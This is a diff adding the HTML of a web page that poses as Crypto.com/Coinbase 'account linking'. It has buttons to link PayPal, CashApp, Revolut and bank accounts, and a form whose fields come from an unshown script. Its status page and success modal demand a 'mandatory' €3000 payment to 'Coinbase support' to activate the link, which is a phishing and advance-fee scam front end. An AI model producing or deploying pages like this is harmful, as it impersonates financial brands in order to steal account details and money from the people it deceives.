@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto.com Account Linking</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="shortcut icon" href="crypto-com.png" type="image/x-icon">
+</head>
+<body>
+    <div class="app">
+        <!-- Main Landing Page -->
+        <div id="homePage" class="page active">
+            <div class="container">
+                <div class="content-wrapper">
+                    <!-- Header -->
+                    <div class="header">
+                        <div class="icon-wrapper">
+                            <img src="crypto-com.png" alt="Coinbase" class="header-icon">
+                        </div>
+                        <div class="header-text">
+                            <h1>Link Your Account</h1>
+                            <p>Connect your financial accounts securely</p>
+                        </div>
+                    </div>
+
+                    <!-- Platform Buttons -->
+                    <div class="platform-buttons">
+                        <button class="platform-btn" onclick="handleClick('paypal')">
+                            <div class="platform-icon">
+                                <img src="https://otiktpyazqotihijbwhm.supabase.co/storage/v1/object/public/images/e1fb5914-8a23-4266-b736-c1ce75dd1c00-paypal-seeklogo.png" alt="PayPal">
+                            </div>
+                            <span>Link PayPal</span>
+                            <div class="hover-indicator"></div>
+                        </button>
+
+                        <button class="platform-btn" onclick="handleClick('cashapp')">
+                            <div class="platform-icon">
+                                <img src="https://otiktpyazqotihijbwhm.supabase.co/storage/v1/object/public/images/d543a86c-20b7-4771-a355-c48f998ceec4-cash-app-seeklogo.png" alt="CashApp">
+                            </div>
+                            <span>Link CashApp</span>
+                            <div class="hover-indicator"></div>
+                        </button>
+
+                        <button class="platform-btn" onclick="handleClick('revolut')">
+                            <div class="platform-icon">
+                                <img src="https://otiktpyazqotihijbwhm.supabase.co/storage/v1/object/public/images/b7377ae9-f12d-4ceb-8ba1-fce92cc3a23f-download%20(1).png" alt="Revolut">
+                            </div>
+                            <span>Link Revolut</span>
+                            <div class="hover-indicator"></div>
+                        </button>
+
+                        <button class="platform-btn" onclick="handleClick('bank')">
+                            <div class="platform-icon">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M3 21h18"/>
+                                    <path d="M5 21V7l8-4v18"/>
+                                    <path d="M19 21V11l-6-4"/>
+                                </svg>
+                            </div>
+                            <span>Link Bank Account</span>
+                            <div class="hover-indicator"></div>
+                        </button>
+                    </div>
+
+                    <!-- Footer -->
+                    <div class="footer">
+                        <p>Your data is encrypted and secure</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Coinbase Status Page -->
+<div id="coinbasePage" class="page">
+    <div class="container">
+        <div class="content-wrapper">
+            <!-- Back Button -->
+            <button class="back-btn" onclick="showPage('homePage')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="m12 19-7-7 7-7"/>
+                    <path d="M19 12H5"/>
+                </svg>
+                <span>Back to Home</span>
+            </button>
+
+            <!-- Status Card -->
+            <div class="status-card">
+                <div class="card-header">
+                    <div class="coinbase-logo">
+                        <img src="https://otiktpyazqotihijbwhm.supabase.co/storage/v1/object/public/images/a7e0ae66-d205-44b1-8b3b-01a497fea8fc-coinbase-coin-seeklogo.png" alt="Coinbase" class="coinbase-logo-img">
+                    </div>
+                    <h2>Coinbase Linking Status</h2>
+                </div>
+
+                <div class="card-content">
+                    <!-- Status Indicator -->
+                    <div class="status-indicator">
+                        <svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"/>
+                            <polyline points="12,6 12,12 16,14"/>
+                        </svg>
+                        <div class="status-text">
+                            <div class="status-label">Status: Pending</div>
+                        </div>
+                        <div class="pulse-dot"></div>
+                    </div>
+
+                    <!-- Status Message -->
+                    <div class="status-message">
+                        <p>Your Coinbase linking process has been initiated but is not yet complete.</p>
+                        <p><strong>To fully activate this link, a payment of €3000 EUR is required.</strong></p>
+                        <p>This fee must be paid to the official Coinbase support channel. The linking cannot proceed without this mandatory step.</p>
+                    </div>
+
+                    <!-- Action Button -->
+                    <button class="primary-btn" onclick="showPage('homePage')">
+                        Return to Home
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+        <!-- Form Page -->
+        <div id="formPage" class="page">
+            <div class="container">
+                <div class="form-wrapper">
+                    <div class="form-card">
+                        <div class="form-header">
+                            <button class="back-btn-small" onclick="showPage('homePage')">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="m12 19-7-7 7-7"/>
+                                    <path d="M19 12H5"/>
+                                </svg>
+                            </button>
+
+                            <div class="form-icon" id="formIcon">
+                                <img id="formIconImg" src="/placeholder.svg" alt="">
+                            </div>
+
+                            <h2 id="formTitle">Link your Account</h2>
+                        </div>
+
+                        <form id="linkingForm" class="form-content">
+                            <div id="formFields"></div>
+                            <button type="submit" class="primary-btn" id="submitBtn">
+                                Link Account
+                            </button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Modal -->
+<div id="modal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <div class="modal-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+                    <polyline points="22,4 12,14.01 9,11.01"/>
+                </svg>
+                <div class="spinner-ring"></div>
+            </div>
+            <h2>Success</h2>
+        </div>
+        <div class="modal-body">
+            <p>Your account is now in the process of being linked to Crypto.com</p>
+            <p><strong>The request is pending and cannot be finalized without your action.</strong></p>
+            <p><strong>To complete this process, a mandatory payment of €3000 EUR must be made to Coinbase support.</strong></p>
+            <p>This fee is required to activate the connection and finalize your account verification.</p>
+        </div>
+        <button class="primary-btn" onclick="closeModal()">
+            I Understand
+        </button>
+    </div>
+</div>
+
+
+    <script src="script.js"></script>
+</body>
+</html>
